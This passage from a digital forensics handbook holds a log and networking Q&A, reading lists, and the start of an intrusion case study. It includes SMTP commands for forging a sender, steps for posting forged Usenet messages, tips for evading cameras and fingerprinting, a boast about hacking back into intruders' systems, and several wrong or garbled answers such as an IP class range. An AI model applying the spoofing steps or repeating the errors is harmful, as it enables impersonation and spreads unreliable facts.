*   **Q. What do Radius logs show?**
*   **A:** They show who connected from remote systems.
*   **Q: List ten UNIX log files and the purpose of each.**
*   **A:** 
    1.  ACCT or PACCT: Contains every command typed by every user on the computer. Also states the date/time of the command.
    2.  ACULOG: A record of when the modems were used to dial out.
    3.  LASTLOG: A record of each user’s most recent login (or failed login).
    4.  LOGINLOG: Records failed logins.
    5.  MESSAGES or SYSLOG: Main system log that contains a wide range of messages. Can be set up to hold firewall and router logs.
    6.  SULOG: Records every attempt to login as root.
    7.  UTMP and UTMPX: A record of all users currently logged in to a computer. The “who” command accesses this file.
    8.  WTMP and WTMPX: A record of all past and current logins. Records system startups and shutdowns. The “last” command accesses this file.
    9.  VOLD.LOG: A record of errors encountered when accessing external media (CD-ROM, diskette, etc.).
    10.  XFERLOG: A record of all files that were transferred from a computer using FTP (File Transfer Protocol.
*   **Q: Where does Win NT usually store log files?**
*   **A:** 
    *   C:\\WINNT\\SYSTEM32\\CONFIG
    *   %SYSTEM3 2 %\\SYSTEM32\\C0NFIG
*   **Q: Name the three NT event log files that end with .evt.**
*   **A:** 
    *   APPEVENT.EVT
    *   SECEVENT.EVT
    *   SYSEVENT.EVT
*   **Q: You have discovered that the log files rolled over before there was a chance to collect them. If you do not have log information, what two methods should you use to try to recover the lost log data?**
*   **A:** Try to extract them from a temp file; look on hidden areas of the disk.

## Encryption

*   **Q: Explain secret key encryption**.
*   **A:** It uses only one key to encrypt and decrypt.
*   **Q: Name one type of public key encryption.**
*   **A:** PGP.
*   **Q: Explain public key encryption.**
*   **A:** Encrypt a file with your public key and decrypt it with your private key (or vice versa). If you encrypt with your private key, you must decrypt with your public key. (You cannot use same key to encrypt and decrypt the same message.)

## Government

*   **Q: Why do corporations not like to get in touch with law enforcement organizations (LEO) concerning computer crime?**
*   **A:** They do not want publicity, and they do not want interference in their business systems.
*   **Q: What is the FBI’s new CIRT team called?**
*   **A:** CRT (Cyber Response Team).

## Networking

*   **Q: What is TCP?**
*   **A:** Transmission Control Protocol.
*   **Q: What is a protocol stack?**
*   **A:** Communications software.
*   **Q: What are the three major layers of the protocol stack that have been discussed?**
*   **A:** Sockets, IP, and TCP.
*   **Q: What layer of the protocol stack is the programming interface to the network hardware?**
*   **A:** Socket layer.
*   **Q: What is the purpose of the TCP/IP protocols?**
*   **A:** It enables computer communication despite o/s or hardware type.
*   **Q: Name seven things the finger command will show.**
*   **A:** 
    1.  Who is logged onto the system
    2.  When they logged on
    3.  When they last logged on
    4.  Where they are logging on from
    5.  How long they have been idle
    6.  If they have mail
    7.  Comment field information
*   **Q: What is the Microsoft Windows NT equivalent command for finger?**
*   **A:** nbtstat.
*   **Q: What command provides information about file systems that are mounted using NFS?**
*   **A:** showmount -e target.
*   **Q: What command provides information relating to the remote procedure call services available on the system and obtains the ports on which these services reside?**
*   **A:** rpcinfo -p target
*   **Q: How does a computer know the packet it is receiving is e-mail, a web page, a Usenet message, etc.?**
*   **A:** By the port number used in the packet header.
*   **Q: What is the standard port for e-mail?**
*   **A:** TCP Port 25.
*   **Q: Explain Class A, Class B, and Class C network IP addresses.**
*   **A:** 
    1.  A. 1.0.0.0—126.0.0.0
    2.  B. 128.0.0.0—191.0.0.0
    3.  C. 192.0.0.0—233.0.0.0
*   **Q: What is the purpose of Domain Name System (DNS)?**
*   **A:** It assigns names to IP addresses for humans.
*   **Q: Name two protocols used to prevent computers from being configured with the wrong BP address.**
*   **A:** BOOTP and DHCP.
*   **Q: What four technologies can wireless networks use?**
*   **A:** RF (radio frequency), infrared, laser, and microwave.
*   **Q: What is the purpose of nslookup? Show two ways it is used.**
*   **A:** 
    *   The purpose of nslookup is to provide the IP address if you give it the URL, or if you provided the URL nslookup provider the IP address.
    *   nslookup [www.whitehouse.gov](http://www.whitehouse.gov)
    *   nslookup 198.137.240.92
*   **Q: What three universal resource locator (URL) sites do you go to find American, European, and Asian IP address information?**
*   **A:** arin.net, ripe.net, and apnic.net.

## E-Mail

*   **Q: How do you see the e-mail headers in MS Outlook? Eudora? Netscape? Pine?**
*   **A:** 
    *   Outlook: View, Options
    *   Eudora: Blah, Blah, Blah
    *   Netscape: Options, Show Headers or View, Header, All
    *   Pine: h
*   **Q: Explain how e-mail headers work and how you can tell which system a message came from and where it is going.**
*   **A:** Read the “Received:” sections from bottom to top. The “From” in the upper “Received:” should be the same as the “By” in the lower “Received:.” There is only one message ID per e-mail. The message ID is used for tracking and does not change from server to server.
*   **Q: What is an MTA? How can an MTA be used to send an e-mail message that hides your true identity? Show the process via exact commands.**
*   **A:** Message Transfer Agent.  
    TELNET MTA.HOST COM 25 
    *   HELO TRICK.EMAIL.COM
    *   MAIL FROM: BILL.CLINTON@WHITEHOUSE.GOV
    *   RCPT TO: ERIC.BELARDO@EDS.COM
    *   DATA  
        Now type in the contents of your message.  
        Type a period on a line by itself to tell the system this is the end of the message.
    *   QUIT
*   **Q: List ten SMTP commands.**
*   **A:** HELO, MAIL, RCPT, DATA, RSET, NOOP, QUIT, HELP, VRFY, EXPN.
*   **Q: How can you tell if a Usenet posting is forged?**
*   **A:** The last news server in “Path” should match the domain in “X-Trace.” Also, if the “Path:” header and the “nntp-posting-host:’ header conflict, the message was forged.
*   **Q: What is the exact procedure (command by command) to access a news server directly?**
*   **A:**  
    TELNET <SERVER NAME> 119 
    
    *   GROUP ALT.BOOM
    *   POST
    
    *   SUBJECT: BLAH, BLAH, BLAH
    *   PATH: Put your false path here
    *   FROM: Put your false e-mail message here
    *   NEWSGROUPS: ALT.BOOM
    
      
    Type in your text and end with a blank line. 
    *   QUIT
*   **Q: How do you find out who sent the forged Usenet message?**
*   **A:** Look in Path:. The first server is forged. Look at the second news server the posting was transferred to (after the!). Contact the system administrator of this box and ask that person to check his or her logs for entries relating to the forged posting. This gives you only the computer name the forger used to do the posting, which is a start.
*   **Q: What must be the case for IRC tracking tools to work (where must you be)?**
*   **A:** The person you want to track must be actively using the same subnet.
*   **Q: Explain four IRC commands, how they must be entered on the command line, and what they do.** 
    *   /WHOIS <NICKNAME> gives e-mail ADR, chat channel, IP address
    *   /WHOWAS <OLD NICKNAME> works as long as info is cached in IRC server
    *   /WHO \*.EDS.COM tells you all personnel on IRC who are coming from this domain
    *   /WHO \*TELLING\* picks up anyone with “telling” in their info
*   **Q: If an fserve is named !fserve, how do you attach to it?**
*   **A:** /!fserve <enter>

# Chapter 10 RecommendedReference materials

DOI: [10.1201/9781003134817-10](https://doi.org/10.1201/9781003134817-10)

Do not be overwhelmed by the number of reference materials recommended in this chapter. The purpose is to help you to focus on which books to purchase for specific subject areas. Are additional excellent books available? Of course. However, I will list books in my possession that I know work. One I do want to mention up front which I highly value is a learning platform from O’Reilly ([https://www.oreilly.com](https://www.oreilly.com)) – take a look and see what you think (subscription-based).

It is best to first obtain these books for your library and then use them on an as-needed basis. Go through the tables of contents and indices of each book. Then go page by page through each book (about five seconds per page) to gain a brief familiarity of what is in each one. When a case arises and you need information pertaining to a subject area, you will have a general idea of which book contains the information you need.

Next, discipline yourself to spend 30 minutes per day reading until you get through all of the books. Mark them up, underline, and take notes in the margins. Make them yours. Get to know them. These books will be like good friends as you proceed through investigations. The knowledge will keep you from getting snowed by those trying to pull the wool over your eyes and it will greatly improve your ability to more efficiently handle your case load. Make audio tapes of key items in the books. Listen to the tapes when you are driving. This will help you pick up information more quickly and remember it better.

## PERL and C Scripts

The “experts” in programming languages, such as C, PERL, and Intel Assembly (the three programming languages that are most used by those who write malicious code used to attack computer networked systems), are those who have spent eight hours or more per day writing code for years. It would be nice to have this level of proficiency, but it is not practical for most persons. However, you do need to know some coding basics so that when you find code during an investigation, you will recognize it as such and, after a quick study of it, will have a basic understanding of what it is doing (or attempting to do). Therefore, I will not attempt to make you a C or PERL expert here. I will only provide some material to use as a quick reference so that when you do encounter code in an investigation, you can at least make some sense of it (however small) rather quickly. I recommend that you purchase for reference the following books and work your way through them as time permits:

 
| **Title:** || **Perl 5 Pocket Reference** |
| --- | --- |
| Publisher: || O’Reilly |
| Author: || Johan Vromans |
| **Title:** || **Teach Yourself Perl in 24 Hours** |
| Publisher: || SAMS |
| Author: || Clinton Pierce |
| **Title:** || **Perl Cookbook** |
| Publisher: || O’Reilly |
| Authors: || Tom Christiansen and Nathan Torkington |
| **Title:** || **C++ in 10 Minutes** |
| Publisher: || SAMS |
| Author: || Jesse Liberty |

## UNIX, Windows, NetWare, and Macintosh

Although approximately 250 operating systems are in use around the world today, 4 operating systems (UNIX, Windows, NetWare, and Macintosh) own the lion’s share of the marketplace. You will run into these four during your investigations more often than any of the others. There are VAX systems, mainframes, etc., but these four will be the mainstays. The reference books I recommend for these are:

 
| **Title:** || **LINUX in Plain Explain** |
| --- | --- |
| Publisher: || MIS Press |
| Authors: || Patrick Volkerding and Kevin Reichard |
| **Title:** || UNIX in Plain English |
| Publisher: || M&T Books |
| Author: || Kevin Reichard and Eric Foster-Johnson |
| **Title** || Unix System Command Summary for Solaris |
| Publisher: || ssc |
| Author: || ssc |
| **Title:** || sed & awk Pocket Reference |
| Publisher: || O’Reilly |
| Author: || Arnold Robbins |
| **Title:** || vi Editor |
| Publisher: || O’Reilly |
| Author: || Arnold Robbins |
| **Title:** || Teach Yourself Linux in 10 Minutes |
| Publisher: || SAMS |
| Author: || John Ray |
| **Title:** || Teach Yourself iMac in 10 Minutes |
| Publisher: || SAMS |
| Author: || Rita Lewis |
| **Title:** || NetWare Command Reference |
| Publisher: || Wiley |
| Authors: || Marci Andrews and Elizabeth Wilcox |
| **Title:** || WindowsNT Desktop Reference |
| Publisher: || O’Reilly |
| Author: || Aeleen Frisch |
| **Title:** || Teach Yourself Windows NT Workstation 4 in 10 Minutes |
| Publisher: || SAMS |
| Authors: || Sue Plumley and Paul Casset |
| **Title:** || Teach Yourself Microsoft Windows 2000 Professional in 10 Minutes |
| Publisher: || SAMS |
| Authors: || Jane Calabria and Dorothy Burke |

## Computer internals

Knowing how a computer works on the inside (both hardware and software) can be a definite asset during an investigation. Studying for and passing CompTIA’s A+ Certification Exam is a big step in this direction. I recommend the following books as references and things to work your way through:

 
| **Title:** || **Exam Prep A+ CompTIA Certified Computer Technician** |
| --- | --- |
| \`Publisher: || Certification Insider Press |
| Author: || Jean Andrew |
| **Title:** || **Teach Yourself Upgrading and Fixing PCs in 24 Hours** |
| Publisher: || SAMS |
| Author: || Galen Grimes |
| **Title:** || **Upgrading and Repairing PCs** |
| Publisher: || QUE |
| Author: || Scott Mueller |
| **Title:** || **TechRef** |
| Publisher: || Sequoia |
| Author: || Thomas Glover and Millie Young |
| **Title:** || **WinRef 98-95 (note: yes, still being used in portions of our global community)** |
| Publisher: || Sequoia |
| Author: || Roger Maves |
| **Title:** || **Pocket PCRef** |
| Publisher: || Sequoia |
| Author: || Tom Glover and Millie Young |
| **Title:** || **DOS Instant Reference (note: yes, still quite useful in various areas of the globe)** |
| Publisher: || SYBEX |
| Author: || Robert Thomas |

## Computer networking

Computer networking is what ties all these systems together to allow malicious attacks (and the necessary business communications) in the first place. A basic understanding of the technology behind this communication system and how it can be attacked is a definite asset. I recommend the following books and CBTs:

 
| **Title:** || **CCNA Virtual Lab e-trainer** |
| --- | --- |
| Publisher: || SYBEX |
| Authors: || Todd Lammle and William Tedder |
| **Title:** || **Cisco Security Architectures** |
| Publisher: || McGraw-Hill |
| Authors: || Gil Held and Kent Hundley |
| **Title:** || **Network Intrusion Detection: An Analyst’s Handbook** |
| Publisher: || New Riders |
| Author: || Stephen Northcutt |
| **Title:** || **Hacking Exposed** |
| Publisher: || Osborne |
| Authors: || Stuart McClure, Joel Scambray, and George Kurtz |

## Websites of interest

*   [http://www.cerias.purdue.edu/coast/#archive](http://www.cerias.purdue.edu)
*   [http://www.isse.gmu.edu/~csis/](http://www.isse.gmu.edu)
*   [http://www.idg.Net](http://www.idg.net)
*   [http://www.forensics-intl.com](http://www.forensics-intl.com)
*   [http://www.cert.org](http://www.cert.org)
*   [http://www.securify.com/packetstorm](http://www.securify.com)
*   [http://www.antionline.com](http://www.antionline.com)
*   [http://www.htcia.org](http://www.htcia.org)
*   [http://www.sans.org](http://www.sans.org)
*   [http://www.dcfl.gov](http://www.dcfl.gov)
*   [http://www.nw3c.org](http://www.nw3c.org)
*   [http://www.ifccfbi.gov](http://www.ifccfbi.gov)
*   [http://www.usdoj.gov/criminal/cybercrime](http://www.usdoj.gov)
*   [http://web.lexis-nexis.com/more/cahners-chicago/11407/6592826/1](http://web.lexis-nexis.com)
*   [http://www.secure-data.com](http://www.secure-data.com)
*   [http://www.guidancesoftware.com](http://www.guidancesoftware.com)
*   [http://www.asrdata.com](http://www.asrdata.com)
*   [http://www.all.net](http://www.all.net)
*   [http://www.dmares.com](http://www.dmares.com)
*   [http://www.vogon.co.uk](http://www.vogon.co.uk)
*   [http://www.fish.com/security/tct.html](http://www.fish.com) (Dan Farmer’s Coroner’s Toolkit may be obtained here.)
*   [http://www.contacteast.com](http://www.contacteast.com)

# Chapter 11 Case study

DOI: [10.1201/9781003134817-11](https://doi.org/10.1201/9781003134817-11)

A historical case that I am familiar with will now be presented. As I mentioned earlier in the book but this bears repeating, keep in mind as you read through this chapter that there will always come new tools and technologies. Also keep in mind that technology you consider current in your particular country could be unavailable in other less-developed or economically challenged countries, and as such you may be forced to work with hardware and software tools less advanced than what you are used to. The important thing is that you understand the concepts involved and don’t tie yourself and your career to only the latest and greatest toolsets and computer systems available. Be able to adjust to whatever is at hand for you to make use of. This case study will assist you with this and will also give you an even better sense of how to use procedures and tools discussed in previous chapters. The names, places, and some information have been altered to protect prior clients. Any names that are similar to those of current corporations or government agencies are coincidental. The persons in the case are:

 
| Bill Miter || Senior network security analyst |
| --- | --- |
| Bob Jacobs || Chief executive officer (CEO) of Nortelem, Inc., Boston, Massachusetts |
| James Roberts || Router administrator(Who left and Steve Wier took his place) |
| Joe Freid || Cable technician |
| Lucy Miles || Manager, system administrators |
| Ron Yougald || System administrator of hacked node |
| Ross Pierce || Manager, physical security personnel |
| Sam Miller || Member, physical security |
| Steve Wier || Router administrator |
| Terry Reiner || Manager, firewall and switch engineers/technicians |

The case began as so many others do – with a call from a potential client who has obtained my name and contact information from a previous, satisfied client. The first words I heard over the telephone from Bob Jacobs, CEO of Nortelem, Inc., were,

> Our website has been hacked at least twice this past week. The first time it occurred, my system administrator, Ron Yougald, took care of the problem – or so he thought. Now it has happened a second time. This is damaging to our reputation. Customers and the world in general will hear about this and believe we can’t even take care of our own systems, much less handle a client’s problems.

He started to continue, but I stopped him, telling Bob he needed to settle down and cease talking about sensitive corporate matters over an unsecured telephone line. Anyone could be listening in. I then asked Bob for his e-mail address. I sent Bob an encrypted e-mail using AT&T’s Secret Agent product. Bob was able to decrypt the e-mail when he received it because we had agreed to a decryption password over the telephone. The e-mail contained my company’s standard contract. Bob was to review it, sign it, and fax it back to me at the number I provided in the e-mail. Bob spent a couple of hours reviewing the contract with his legal department. He then signed and faxed the contract to me. During that time, I verified that Bob Jacobs and Nortelem were actually who Bob had said they were. Now I could take action. I immediately booked a flight to Boston – the home of Nortelem, Inc.

I should note here that my preference is for clients to already be a subscriber to my cyber forensics service. Contracts are already signed, procedures and codewords are agreed to, etc. My company receives a monthly, quarterly, or annual fee (depending on the client) for being ready to respond to a client within a specified timeframe. There are also secure communications lines and procedures already in place. In Nortelem’s case, there was nothing in place. Thus, the initial communications were not secure, and time was lost in getting a contract ready.

## Travel security

I want to point out something else that is of importance – your personal safety. It could be that the client you are planning to assist is an organization, such as transportation or utilities or financial, that is part of the critical infrastructure of numerous countries, including the United States and Europe. It could also be that a terrorist group or some organized crime faction is responsible for the malicious event you are moving forward to investigate. Don’t laugh … you must take this seriously in today’s world. Just recall all the various news stories you have read over the past few years. It’s better to be somewhat paranoid and live than to think it’s just you and some machines you have to work with … and die. I’ve lived and worked in 12 countries for the military, the intelligence community, defense contractors, and normal everyday corporations for 50 years … and more than once I was glad to have followed the security training that I had received … it kept me among the living. So here, I’m passing on to you some key items that the average person can use when you are traveling to and from client sites. You probably won’t be able to do everything I mention here, but do as much as you can.

1.  Stay alert at all times. Don’t bury your face into your cellphone unless you absolutely have to for some reason when you are out and about. And get off that phone as quickly as possible and stay alert as to what is happening around you. Be constantly aware of your surroundings. Don’t walk around in some ignorant blissful state of mind. Bad things happen every day to people. Don’t be one of the statistics just because you didn’t feel like being alert to what was going on around you. Be alert at all times.
2.  If you are traveling to a country and a language foreign to you but is spoken by most people on the street, learn some short key phrases you can use in an emergency and build on your vocabulary as needed while you are in the country. At one point in my career, I ended up working for over a year in Egypt and while there I attended classes in Arabic three times a week. Such learning can be quite beneficial so don’t waste your time being involved in meaningless evening pursuits while working in another country … learn. You never know until later just what new adventures you can take advantage of due to something you learned as an evening pastime.
3.  Don’t think that standard airline travel, such as Delta, United, etc. is the only way to get around in the Americas (Canada, the United States, Mexico, Central America, and South America) and other areas such as Europe and so on. As an example, and perhaps you are not aware, that there are many private airstrips throughout the United States that citizens maintain right next to their homes (or very close by, near farms, etc.), and these people have their own private planes sitting right there. To keep your travel much more private, take advantage of these as I have for the past 50 years (yep, I’ve been in this line of work for quite a while). Establish relationships, and even if you don’t have an established relationship, many of these people are more than pleased to pick up the dollars for taking you somewhere … so drop in on them and ask if you wish to go this route.
4.  If possible, don’t use a key fob to electronically open your car doors, trunk, or to start your car remotely. Don’t keep it with you (keep it in a safe place in a box that radio waves can’t penetrate) and just use the plain car keys. You risk having both the car and you hijacked when you carry an electronic key fob around in your pocket. Keep in mind that one key fob can open more than one vehicle, even in the same parking lot … it just depends.
5.  You may think that the following items have some negative thinking around them, but understand that over a 50-year period I know all the following occur (and more) so you have to follow the Boy Scout motto and “Be Prepared.” Assume up front that all of the following are going to happen and don’t make excuses for not being able to do your job: 
    1.  a. You have somehow lost access to your mobile phone, laptop, and wallet/purse. Be sure to memorize at least (and preferably 3–10) one phone number that you can use to rescue yourself and your operation, whether that’s a friend, colleague, employer, client, etc. A number that can get you out of the trouble you are in.
    2.  b. If you use something like Dropbox, be sure to strongly encrypt what you put there. Having access to more than one account is also a plus because access to one may fail for whatever reason.
    3.  c. You were counting on your GPS (on your phone, in your car, on your laptop, or whatever) and it fails. It’s not working. Be sure to memorize at least one route that can get you from X to Y (whatever locations are critical to this endeavor) before venturing out. If you have an excellent memory, memorize more routes. You can of course keep a small map in your purse or wallet but again you need to assume you are going to lose those items for whatever reason.
    4.  d. Perhaps you are in a location where you don’t want to leave fingerprints for some reason. If so, either wear gloves or if that is not an option wash your hands in a solution (such as a silicone solution) that prevents the oil from your fingers from leaving fingerprints.
    5.  e. Perhaps you are working on something where you prefer to minimize the chances of someone identifying who you are. So many cameras out there nowadays, it can be difficult, but you can significantly increase these privacy issues. Wear a hat and sunglasses, keep your head tilted in a way that makes it more difficult for a camera to identify you via some software-based program. Also keep in mind that you can be identified by the top of your hands also, not just your fingerprints. Cameras are so good now that the tops of your fingers and hands can be used as a means of identification and if the other side of your hands can be seen on camera (fingerprints) that can also identify you. One idea is to wear gloves, but if that is not feasible coat your fingers in a solution that prevents the cameras from identifying you by your hands. There are multiple items for that, and one for the average person could be pretending you have poison ivy (or whatever) on your hands and so you coat the fingers or hands with calamine lotion to prevent the itching (no one will want to touch those hands either). Do you have some tattoos or other prominent abnormal items on your skin that can identify you? If so, do something to cover them (note that dermatologists have various light therapies that can remove tattoos you wish you no longer had … and don’t let pride in some tattoo keep you from covering or eliminating it). Other items are your eyes, and you can pick up some contact lenses that can both make your eyes a different color and prevent various electronic devices from directly accessing your eyes. Use your imagination and look at various websites on the Internet that specialize in “protection gear” for the average person. I would also recommend wearing special travel clothes that protect you from pickpockets, as an example have a look at: 
        1.  i. [https://www.clothingarts.com/](https://www.clothingarts.com)
    6.  f. Before you leave on your venture, it’s much better (if you have the time) to carefully plan out what you are going to do step by step on a drawing board. Up front planning can make a big difference as you continue down the road.
    7.  g. Take self-defense classes and keep yourself in good physical condition. You don’t need a black belt … you just need to know a few solid offensive/defensive moves that you practice daily and become habitual to use.
    8.  h. If you are working in a foreign country, setup a bank account while you are there and establish relationships. Also, setup post office boxes in different cities for mail purposes. These may well come in quite handy in the future.
    9.  i. I don’t want to get much more into this because an entire book could be written on travel safety, but I’ll mention one last item. Perhaps someone wants to sneak up behind you and strangle you. You think … are you crazy?! No one wants to do that to me! Yes, that’s what other people thought who are no longer with us. Again, for a small sum, you can purchase a comfortable neck collar that blends in with your skin and you wear around your neck. With that in place, someone coming up from behind (or during a fight) won’t be able to strangle you (form behind or in front) and strikes to your throat will not be effective. There are websites that sell these and many other items, both offensive and defensive items, that can be hidden in plain sight but could save your life. Be prepared!
6.  Establish friendly relationships with law enforcement at the Federal, State, and local levels. Such relationships can go a long way in various situations and get you instant assistance when otherwise you either wouldn’t get the time of day or you would be placed as a low priority. So, attend events, meet them for breakfast, lunch or dinner, etc. Be known by some key vendors of products you use (preferably at an executive and/or managerial level).
7.  Learn Morse code. Morse code?! Why? Although it seems out of place in the modern world of today, it is still used on a regular basis globally in various circles. For example: 
    1.  a. You have been taken hostage and a video is being taken of you or of the group you are in. Perhaps you need to let law enforcement (or someone else) know your location so they can come and rescue you. You just simply use the opening and closing of your eyes to send a Morse code message that just states your location. Could be a life saver.
    2.  b. You are taken prisoner in a room by yourself, with no windows, only the door and walls. You think someone else who is in trouble is in the room next to yours. You lightly tap the walls with Morse code to communicate. They may or may not know the code but at least you can try.
    3.  c. You are sitting in a café outside (or inside) and waiting on a colleague and the two of you, for whatever reason, don’t want others to know that you know each other. If you both know Morse code, you can communicate with each other just using your eyes, but of course you only want to do it for a very short conversation or someone may pick up on it.

## Wireshark and Python

During my conversation with the client, we learn a piece of good news … the client runs Wireshark 24 × 7 × 365 and keeps backups for 30 days. This is great news. So, before we continue on our adventure let’s take some time to understand just what Wireshark is and how it can help us during our investigation. This will just be a short discussion of Wireshark since there are entire books written on this subject area if you wish to learn more. We will also examine how we can use a programming tool like Python (PyShark in this case) to enhance our work with Wireshark.

To start things off here, go ahead and download Wireshark and Python from:

*   [https://www.wireshark.org](https://www.wireshark.org)
*   [https://www.python.org/downloads](https://www.python.org)

Download what is appropriate for the operating system you are using. In my case, I am downloading Python 3.9.2 for Windows and Wireshark 3.4.3 for 64-bit Windows. We will be using PyShark in order to modify how Wireshark captures and filters the packets it collects. Wireshark can perform the following feats for us:

*   It allows us to see what protocols are being used on the network.
*   It captures live packet data.
*   It views detailed protocol information within the packets.
*   It filters packets based on various criteria.
*   It examines security problems.
*   It observes what happened, when it happened, where it came from, how it happened.

Here is a look at what the Wireshark GUI looks like:

![](images/inline11.1.jpg)

Since the print in the above screenshot is a little small, let’s break it down by sections, from the top down.

*   First, we see the name of the file, MostOfTheDay.pcapng
*   Next, we see the various menu items we can select from
*   After packet collection, we can use the display filter area (Filter Toolbar) to focus in on what is of importance to us

![](images/inline11.2.jpg)

Packet List Pane (PLP):

*   This shows you the packets that have been captured. Each line is a separate packet.
*   The column headings shown are: 
    *   No. 
        *   – One of the items you will see in this column is symbols used to designate where a packet conversation begins, ends, etc. I mention this along with the symbology used very soon.
    *   Time
    *   Source
    *   Destination
    *   Protocol
    *   Length
    *   Info

![](images/inline11.3.jpg)

Packet Details Pane (PDP):

*   When you highlight any of the colored lines in the above screenshot, the PDP shows you the details of that packet.

![](images/inline11.4.jpg)

Packet Byte Pane (PBP):

*   Presents a hex/ASCII dump view of the current packet you have selected.

![](images/inline11.5.jpg)

A short time ago I mentioned the use of symbols in the first column of the PLP. These are used to help you track the flow of a conversation. The colors you see are part of the default color scheme of Wireshark. Here they are:

*   First packet in a conversation 
    *   ![](images/inline11.6.jpg)
*   Packets that are a part of the conversation you selected 
    *   ![](images/inline11.7.jpg)
*   Those first two above you can see in the PLP above. The following items you have not seen yet …
*   Not part of the packet conversation you selected 
    *   ![](images/inline11.8.jpg)
*   The last packet in the packet conversation you selected 
    *   ![](images/inline11.9.jpg)
*   These two arrows are for DNS Request (arrow points right) and DNS Response (arrow points left) 
    *   ![](images/inline11.10.jpg)
*   The selected packet acknowledges this packet 
    *   ![](images/inline11.11.jpg)
*   The selected packet is a duplicate acknowledgment of this packet 
    *   ![](images/inline11.12.jpg)
*   The selected packet is related to this packet in some other way 
    *   ![](images/inline11.13.jpg)
*   Note also that if you observe brackets \[ \] and links in the PDP, such information has been generated by Wireshark and is not a part of the packet contents.

For our investigation, it is quite useful to color packets differently depending on which conversation it is. Wireshark comes with default coloring rules but you can change colors as you see fit.

Something to keep in mind about Wireshark (and any other protocol analyzer for that matter) is that it can only observe and interpret protocols that it knows about (which are many). There are numerous protocols written globally by military and government entities (e.g., federal law enforcement agencies, intelligence organizations such as MI-5/6, CIA, NSA, corporate entities, organized crime, and others) that are kept secret and/or proprietary. Wireshark won’t be aware of those. I started writing my own protocols in the year 2000, first for experimental purposes, and then for privacy and work-related purposes. I found the programming languages of C and Intel/Motorola Assembly to be excellent for this purpose although I’ve experimented with other languages when I was in the mood and had the time to learn something new. There are books you can pick up on this topic if you have an interest in such a venture. A definite advantage to having this skillset is the ability to set up computer networks and systems that work in a normal fashion but stealthily await the presence of an intruder without the intruder even being aware of the unknown protocols you have written. You can then respond to the intruder in the manner of your choosing without them even being aware you are tracking them, moving in and through systems they are using, etc. I wrote the protocols and set up an automated process many years ago that handles this for me, all the while the intruder thinking they got in and out undetected, but instead taking me back into their own systems and leaving my own “gifts” that they most likely would never be aware of. In addition to this, another skillset that has value is building your own motherboard along with writing your own BIOS/Kernel/Operating System (just a micro type but one that will do the job). I started this back in 1985 using the Z80 microprocessor. This usage of this skillset also has broad ramifications and benefits, especially if you are privacy/security oriented. Again, there are books you can purchase to study for this type of endeavor if you so desire.

Now let’s move further on into our case …

During my trip to Dulles airport via a cab, I sent Bob an encrypted e-mail (my laptop is set up for wireless encrypted communications) with a list of questions needing answers immediately so that I could better plan my strategy while on the airplane. (I usually use a cab because it allows me to work on the client’s issues instead of having to spend time focusing on driving in traffic.) In this way, I made the best use of the time available to me. The questions I asked and the comments made were as follows:

*   Have your physical security personnel secured the area where the security incident occurred if possible?
*   Do *not* turn the web server back on until after I arrive. If at all possible, no one should touch the machine until I arrive.  
    **Note:** It would have been much better for me if the system administrator had never touched the box. Because Ron had turned the web server off, I lost potentially valuable information from random-access memory (RAM). Now, if Ron were to turn the server back on, I would lose even more information because of the way the operating system would overwrite certain key areas of the hard drive during boot up.
*   As I understand it, the victim is one NT4 web server running SP5 (Microsoft Service Pack) Option Pack 4 and IIS4 (Internet Information Server 4.0). Is this correct? \[Yes. Be sure you know the platform(s)/operating system(s) being utilized by the client. This helps greatly in your preparation to solve the problem at hand.\]
*   Were any changes made to the operating system in the past four weeks? \[SP5 was loaded onto the web server after the first hack occurred. Also, various Microsoft security patches were loaded after the first attack, giving the client a false sense of security. It also adversely impacted my investigation because once again this meant they overwrote some information on the hard drive that might have led me to the hacker. They should not have touched the machine at all once the hack occurred. Their best move would have been to just pull the network connection from the back of the machine so that the web server would no longer be advertising on the Internet.\]  
    **Note:** If you do install any patches to an operating system, be sure to hide or remove the old system files. If you do not, a hacker can come along and reverse the patch process, removing your patch and putting back the old system files that had vulnerabilities.
*   Who first noticed the compromised system? Exactly when? \[Sam Miller, a member of physical security, first noticed the hack on July 23 at around 5 a.m. Sam immediately contacted his manager, Ross Pierce, who contacted the CEO, Bob Jacobs. Bob contacted Lucy Miles, manager of the system administrators. Lucy contacted Ron Yougald and told him to bring down the web server. Ron did so about 5:47 a.m.\]
*   List individuals who have rights on this machine. What rights do they have? \[The web server is in the NorTrust domain. There are also local security groups on the web server that you can look at when you bring it up. Also provided to me was a list of system administrators, domain administrators, and users of the system. In this case, there were a total of 13 system/domain administrators who had full systemwide access to the hacked web server. This is far too many. It is best to have only two people who have full system access to a server, with the current Admin system password placed in a sealed envelope and locked in a safe, which is supervised by the physical security department.\]
*   I want a copy of their security policies/procedures document, if they have one. \[Unfortunately, no documented security policies/procedures are in place. Both groups and individuals are granted file access by e-mail requests to the web server administration team. No NT audit software is in use. These are poor security practices. No one should have system administrator rights to a web server unless there is a solid “company need” and this is agreed to by two managers who are above the potential system administrator and understand exactly what those rights mean from a business perspective.\]
*   Does anyone involved have any idea why this incident occurred? \[No.\]
*   What is the age of this NT4 system? \[NT was configured and loaded by Ron Yougald about one year ago. IIS4 configuration was loaded by Scott Yaser six months later. About three months ago, IIS4 was reconfigured by Darlene Mencer. None of these employees know each other and none of them conferred with the others concerning the work each did on the web server. Also, no one documented the work they did – not enough time, they said – management had other priorities for them. Again, this is a poor security practice. As an aside, the age of a system can be important. An aging hard drive can act as though it has been maliciously tampered with.\]
*   Can you send an electronic copy of the network infrastructure that surrounds this box (IP \[Internet Protocol\] addresses are not necessary)? \[Some companies will provide this information, others will not. If you do receive it, be sure the communication session is encrypted and that you take care that this documentation does not fall into the wrong hands. Having this information is a great help to developing your plan of attack while en route to the client site.\]
*   For this NT4 system: is it set up as FAT or NTFS? \[FAT for boot Windows NT 4.0 Server OS (local C:\\ drive). NTFS for IIS4 and share folders (local D:\\drive).\]
*   How large are the hard drives on the system? How many are there? \[The system has six physical hard drives at 9 GB each. This is important because you need to be sure that the backup media you will use can handle the hard drive capacity of the machine(s) you are investigating. A cellular telephone and wireless laptop connection to the Internet are critical. If you find that you do not have what you need while you are en route to the client site, either call to be sure there is a computer supply house close to the client site from which you can quickly obtain the necessary items (such as backup tapes or hard drives or CD-ROMs) or order needed items online and have them overnighted to the client site.\]
*   Are there Small Computer Systems Interface (SCSI) or parallel ports on the back of the box? \[Both SCSI and parallel ports are available. There is more than one type of SCSI cable, so be sure to find out specifically which type of cable it is. Again, if you do not have the necessary cables with you, be sure you can either obtain them from a local computer store near the client or order them online and have them overnighted to the client site.\]  
